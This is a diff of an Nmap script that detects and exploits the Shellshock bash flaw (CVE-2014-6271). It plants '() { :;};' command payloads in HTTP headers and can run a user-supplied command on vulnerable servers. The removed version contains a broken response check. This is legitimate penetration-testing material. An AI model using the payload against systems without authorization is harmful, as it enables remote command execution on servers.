@@ -1,99 +1,144 @@
 local http = require "http"
-local stdnse = require "stdnse"
-local nmap = require "nmap"
 local shortport = require "shortport"
+local stdnse = require "stdnse"
+local string = require "string"
+local vulns = require "vulns"
+local rand = require "rand"
 
+description = [[
+Attempts to exploit the "shellshock" vulnerability (CVE-2014-6271 and
+CVE-2014-7169) in web applications.
 
+To detect this vulnerability the script executes a command that prints a random
+string and then attempts to find it inside the response body. Web apps that
+don't print back information won't be detected with this method.
 
--- Fast-path bindings for the stdlib and nmap API used by this script.
--- Kept strict-mode safe: every name below is a declared local.
-local format = string.format
-local lower = string.lower
-local upper = string.upper
-local byte = string.byte
-local sub = string.sub
-local match = string.match
-local gmatch = string.gmatch
-local gsub = string.gsub
-local find = string.find
-local rep = string.rep
-local char = string.char
-local concat = table.concat
-local insert = table.insert
-local remove = table.remove
-local sort = table.sort
-local move = table.move
-local tostring = tostring
-local tonumber = tonumber
-local type = type
-local pcall = pcall
-local pairs = pairs
-local ipairs = ipairs
-local unpack = table.unpack
-local setmetatable = setmetatable
-local getmetatable = getmetatable
-local error = error
-local select = select
+By default the script injects the payload in the HTTP headers User-Agent,
+Cookie, and Referer.
 
-local clock = nmap.clock
-local msleep = nmap.msleep
+Vulnerability originally discovered by Stephane Chazelas.
 
--- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
-local sleep = function(seconds)
-    return nmap.msleep(math.max(0, math.floor(seconds * 1000)))
+References:
+* http://www.openwall.com/lists/oss-security/2014/09/24/10
+* http://seclists.org/oss-sec/2014/q3/685
+* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+]]
+
+---
+-- @usage
+-- nmap -sV -p- --script http-shellshock <target>
+-- nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
+-- @output
+-- PORT   STATE SERVICE REASON
+-- 80/tcp open  http    syn-ack
+-- | http-shellshock:
+-- |   VULNERABLE:
+-- |   HTTP Shellshock vulnerability
+-- |     State: VULNERABLE (Exploitable)
+-- |     IDs:  CVE:CVE-2014-6271
+-- |       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+-- |       is executing commands injected via malicious HTTP headers.
+-- |
+-- |     Disclosure date: 2014-09-24
+-- |     References:
+-- |       http://www.openwall.com/lists/oss-security/2014/09/24/10
+-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+-- |       http://seclists.org/oss-sec/2014/q3/685
+-- |_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+--
+-- @xmloutput
+-- <elem key="title">HTTP Shellshock vulnerability</elem>
+-- <elem key="state">VULNERABLE (Exploitable)</elem>
+-- <table key="ids">
+-- <elem>CVE:CVE-2014-6271</elem>
+-- </table>
+-- <table key="description">
+-- <elem>This web application might be affected by the vulnerability known as Shellshock. It seems the server
+-- &#xa;is executing commands injected via malicious HTTP headers. &#xa;      </elem>
+-- </table>
+-- <table key="dates">
+-- <table key="disclosure">
+-- <elem key="year">2014</elem>
+-- <elem key="day">24</elem>
+-- <elem key="month">09</elem>
+-- </table>
+-- </table>
+-- <elem key="disclosure">2014-09-24</elem>
+-- <table key="refs">
+-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169</elem>
+-- <elem>http://www.openwall.com/lists/oss-security/2014/09/24/10</elem>
+-- <elem>http://seclists.org/oss-sec/2014/q3/685</elem>
+-- <elem>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</elem>
+-- </table>
+-- @args http-shellshock.uri URI. Default: /
+-- @args http-shellshock.header HTTP header to use in requests. Default: User-Agent
+-- @args http-shellshock.cmd Custom command to send inside payload. Default: nil
+---
+author = {"Paulino Calderon <calderon()websec.mx","Paul Amar <paul()sensepost com>"}
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
+categories = {"exploit","vuln","intrusive"}
+
+portrule = shortport.http
+
+function generate_http_req(host, port, uri, custom_header, cmd)
+  local rnd = nil
+  --Set custom or probe with random string as cmd
+  if not cmd then
+    local rnd1 = rand.random_alpha(7)
+    local rnd2 = rand.random_alpha(7)
+    rnd = rnd1 .. rnd2
+    cmd = ("echo; echo -n %s; echo %s"):format(rnd1, rnd2)
+  end
+  cmd = "() { :;}; " .. cmd
+  -- Plant the payload in the HTTP headers
+  local options = {header={}}
+  options["no_cache"] = true
+  if custom_header == nil then
+    stdnse.debug1("Sending '%s' in HTTP headers:User-Agent,Cookie and Referer", cmd)
+    options["header"]["User-Agent"] = cmd
+    options["header"]["Referer"] = cmd
+    options["header"]["Cookie"] = cmd
+  else
+    stdnse.debug1("Sending '%s' in HTTP header '%s'", cmd, custom_header)
+    options["header"][custom_header] = cmd
+  end
+  local req = http.get(host, port, uri, options)
+
+  return req, rnd
 end
-
-local strsplit = function(sep, str, max)
-    local out, pos, n = {}, 1, 0
-    if str == nil then return out end
-    while true do
-        if max and n >= max - 1 then
-            out[#out + 1] = sub(str, pos)
-            return out
-        end
-        local s, e = find(str, sep, pos)
-        if not s then
-            out[#out + 1] = sub(str, pos)
-            return out
-        end
-        if e < pos then e = pos end
-        out[#out + 1] = sub(str, pos, s - 1)
-        pos = e + 1
-        n = n + 1
-        if pos > #str then
-            out[#out + 1] = ""
-            return out
-        end
-    end
-end
-
-local format_output = stdnse.format_output
-local output_table = stdnse.output_table
-
-description = [[Tests CGI scripts for the Shellshock (CVE-2014-6271) vulnerability by sending a malicious User-Agent header containing a shellshock payload.]]
-author = "HackIT Framework"
-license = "HackIT Framework — Internal Use Only"
-categories = {"web", "safe"}
-
-portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" end
 
 action = function(host, port)
-    local cgi_paths = {"/cgi-bin/test.cgi", "/cgi-bin/test", "/cgi-sys/defaultwebpage.cgi", "/cgi-bin/printenv", "/cgi-bin/"}
-    local test_payload = "() { :;}; echo; echo vulnerable"
-    local results = {}
-    for _, path in ipairs(cgi_paths) do
-        local options = {header = {["User-Agent"] = test_payload}}
-        local resp = http.get(host, port, path, options)
-        if resp and resp.body then
-            if resp.find(body, "vulnerable") then
-                insert(results, "Shellshock vulnerability confirmed at " .. path)
-            elseif resp.status and resp.status < 400 then
-                insert(results, "CGI endpoint at " .. path .. " (status " .. resp.status .. ")")
-            end
-        end
+  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or nil
+  local http_header = stdnse.get_script_args(SCRIPT_NAME..".header") or nil
+  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/'
+  local req, rnd = generate_http_req(host, port, uri, http_header, nil)
+  if req.status == 200 and req.body:find(rnd, 1, true) then
+    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
+    local vuln = {
+      title = 'HTTP Shellshock vulnerability',
+      state = vulns.STATE.NOT_VULN,
+      description = [[
+This web application might be affected by the vulnerability known
+as Shellshock. It seems the server is executing commands injected
+via malicious HTTP headers.
+      ]],
+      IDS = {CVE = 'CVE-2014-6271'},
+      references = {
+        'http://www.openwall.com/lists/oss-security/2014/09/24/10',
+        'http://seclists.org/oss-sec/2014/q3/685',
+        'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169'
+      },
+      dates = {
+        disclosure = {year = '2014', month = '09', day = '24'},
+      },
+    }
+    stdnse.debug1("Random pattern '%s' was found in page. Host seems vulnerable.", rnd)
+    vuln.state = vulns.STATE.EXPLOIT
+    if cmd ~= nil then
+       req = generate_http_req(host, port, uri, http_header, cmd)
+       vuln.exploit_results = req.body
     end
-    if #results == 0 then
-        return format_output(false, "No Shellshock vulnerability detected")
-    end
-    return format_output(true, concat(results, "\n"))
+    return vuln_report:make_output(vuln)
+  end
 end
